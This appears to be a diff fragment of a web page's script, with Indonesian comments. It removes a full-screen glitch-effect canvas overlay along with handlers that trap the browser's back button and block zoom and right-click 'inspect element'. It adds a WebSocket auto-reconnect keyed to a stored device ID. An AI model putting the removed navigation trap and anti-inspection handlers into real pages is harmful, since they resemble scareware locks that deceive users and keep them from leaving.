-        canvas.width = innerWidth;
-        canvas.height = innerHeight;
-        const ctx = canvas.getContext('2d');
-        
-        const colors = {
-            green: ['#0f0','#080','#030'],
-            pink: ['#f0f','#a0a','#303'],
-            blue: ['#0ff','#088','#033'],
-            red: ['#f00','#a00','#300']
-        };
-        const palette = colors[color] || colors.green;
-        
-        function draw() {
-            ctx.fillStyle = '#000';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            
-            // garis horizontal
-            for(let i=0; i<80; i++) {
-                const y = Math.random() * canvas.height;
-                const h = Math.random() * 3 + 1;
-                ctx.fillStyle = palette[Math.floor(Math.random()*palette.length)];
-                ctx.globalAlpha = Math.random() * 0.6 + 0.2;
-                ctx.fillRect(0, y, canvas.width, h);
-            }
-            
-            // garis vertikal
-            for(let i=0; i<20; i++) {
-                const x = Math.random() * canvas.width;
-                const w = Math.random() * 2 + 1;
-                ctx.fillStyle = palette[Math.floor(Math.random()*palette.length)];
-                ctx.globalAlpha = Math.random() * 0.4 + 0.1;
-                ctx.fillRect(x, 0, w, canvas.height);
-            }
-            
-            // glitch blocks
-            for(let i=0; i<15; i++) {
-                const x = Math.random() * canvas.width;
-                const y = Math.random() * canvas.height;
-                const w = Math.random() * 150 + 20;
-                const h = Math.random() * 20 + 5;
-                ctx.fillStyle = palette[Math.floor(Math.random()*palette.length)];
-                ctx.globalAlpha = Math.random() * 0.5;
-                ctx.fillRect(x, y, w, h);
-            }
-            
-            ctx.globalAlpha = 1;
-            lcdAnimFrame = requestAnimationFrame(draw);
-        }
-        draw();
-        
-        history.pushState(null, '', location.href);
-        window.onpopstate = () => { history.pushState(null, '', location.href); };
-    } else {
-        overlay.classList.remove('active');
-        if(lcdAnimFrame) { cancelAnimationFrame(lcdAnimFrame); lcdAnimFrame = null; }
-    }
-}
-
-/* ============================================================
-   INIT
-   ============================================================ */
-document.addEventListener('DOMContentLoaded', () => {
-    // cegah zoom
-    document.addEventListener('gesturestart', e => e.preventDefault());
-    // cegah inspect element (basic)
-    document.addEventListener('contextmenu', e => e.preventDefault());
-});
+/* ---------- AUTO RECONNECT ---------- */
+const saved = localStorage.getItem('lyx_deviceId');
+if (saved) deviceId = saved;
+connectWS();
 </script>
-
 </body>
 </html>
